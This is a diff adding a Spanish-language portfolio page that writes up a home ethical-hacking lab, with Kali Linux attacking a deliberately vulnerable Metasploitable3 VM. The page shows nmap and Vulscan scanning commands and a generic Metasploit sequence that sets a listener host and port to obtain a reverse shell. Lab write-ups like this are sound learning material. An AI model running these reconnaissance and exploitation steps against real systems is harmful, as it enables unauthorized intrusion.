@@ -1,0 +1,148 @@
+<!DOCTYPE HTML>
+<!--
+	Hyperspace by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+
+<head>
+    <title>Portfolio - descripción Reconocimiento y Explotación</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="assets/css/main.css" />
+    <noscript>
+        <link rel="stylesheet" href="assets/css/noscript.css" />
+    </noscript>
+</head>
+
+<body class="is-preload">
+
+    <!-- Header -->
+    <header id="header">
+        <a href="index.html" class="title">Inicio</a>
+        <nav>
+            <ul>
+                <li><a href="index.html">Home</a></li>
+                <li><a href="hacking1.html" class="active">Hacking Ético Parte 1</a></li>
+                <!-- <li><a href="elements.html">Elements</a></li> -->
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Wrapper -->
+    <div id="wrapper">
+
+        <!-- Main -->
+        <section id="main" class="wrapper">
+            <div class="inner">
+                <h1 class="major">Reconocimiento y Explotación con Kali Linux y Metasploitable3</h1>
+                <div style="text-align: center;">
+                <span class="image fit"><img src="images/hacking2.png"  alt="Captura Resultados"/></span>
+                </div><br>
+                <h2></h2><br>
+        <h2>🛡️ Hacking Ético – Parte 1: Reconocimiento y Explotación con Kali Linux y Metasploitable3</h2><br>
+        
+        <p> quiero compartir uno de los trabajos que más disfruté durante mi aprendizaje en hacking ético. Esta es la Parte 1 de
+        una serie donde exploramos todo el proceso, desde el reconocimiento hasta la explotación de vulnerabilidades en un
+        entorno controlado. 💻⚔️<br><br><br><br>
+        <b>🧪 Laboratorio de Pruebas<br></b>
+        
+        Para esta práctica creé un laboratorio en entorno local compuesto por:
+        
+        Kali Linux como máquina atacante.
+        
+        Metasploitable3 como máquina víctima (una VM vulnerable intencionadamente).
+        
+        Ambas máquinas se conectan en una red interna (NAT o Host-Only), simulando un entorno realista.
+        <b>🔍 Fase de Reconocimiento: Escaneo de Puertos</b>
+        
+        La primera fase del ataque es el reconocimiento. Usamos nmap para descubrir los servicios expuestos por la máquina
+        víctima:
+        
+       <b> nmap -sS -sV 192.168.X.X</b></p><br>
+        
+        Esto nos proporciona información crucial como:<br>
+        
+       <b> Puertos abiertos<br>
+        
+        Servicios en ejecución<br>
+        
+        Versiones de los servicios<br>
+        
+        🔎 Enumeración de Vulnerabilidades: Vulscan<br></b>
+        
+        Una vez identificados los puertos, ampliamos el análisis con el script Vulscan (plugin para Nmap) que permite asociar
+        los servicios detectados con posibles vulnerabilidades conocidas:<br>
+        
+        <b>nmap -sV --script=vulscan/vulscan.nse 192.168.X.X<br></b>
+        
+        Esto nos arroja posibles CVE y detalles sobre vulnerabilidades aprovechables. Aunque Nmap también ofrece scripts como
+        vulners, Vulscan fue el elegido para esta práctica.<br>
+        <b>💣 Fase de Explotación: Metasploit Framework<br></b>
+        
+        Con la información en mano, pasamos a la explotación. Iniciamos Metasploit:<br>
+       <b>msfconsole<br> </b>
+        
+        Buscamos módulos de explotación disponibles para los servicios detectados:<br>
+        
+       <b> search nombre_servicio / puerto<br>
+        
+        Una vez localizado el exploit adecuado:<br>
+        
+        use exploit/...<br>
+        set RHOST 192.168.X.X<br>
+        set LHOST TU_IP<br>
+        set LPORT 4444<br>
+        run<br></b>
+        
+        Si el exploit tiene éxito, obtendremos una shell reversa, es decir, acceso remoto a la máquina víctima.<br>
+       <b> 🧠 ¿Qué logramos hasta aquí?<br></b>
+          
+        <div style="text-align: center;">
+            <span class="image fit"><img src="images/hacking.png" alt="Captura Resultados" /></span>
+        </div><br>
+        
+        Además de conseguir la shell reversa también: <br>
+
+        Entendimos el proceso de escaneo y enumeración con Nmap.<br>
+        
+        Identificamos vulnerabilidades mediante Vulscan.<br>
+        
+        Ejecutamos un exploit real con Metasploit en un entorno controlado.<br>
+        
+        Obtuvimos acceso a una máquina vulnerable simulando un ataque real.<br>
+        
+        Objetivo educativo: comprender cómo un atacante podría operar, para así mejorar nuestras
+        defensas como profesionales de la ciberseguridad.<br>
+        
+        💥 En la Parte 2, veremos cómo mantener la persistencia dentro del sistema comprometido. 🔐     <br>   
+  </p>
+   
+        </div>
+        </section>
+
+    </div>
+
+    <!-- Footer -->
+    <footer id="footer" class="wrapper alt">
+        <div class="inner">
+            <ul class="menu">
+                <li>&copy; Untitled. All rights reserved.</li>
+                <li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+            </ul>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/jquery.scrollex.min.js"></script>
+    <script src="assets/js/jquery.scrolly.min.js"></script>
+    <script src="assets/js/browser.min.js"></script>
+    <script src="assets/js/breakpoints.min.js"></script>
+    <script src="assets/js/util.js"></script>
+    <script src="assets/js/main.js"></script>
+
+</body>
+
+</html>
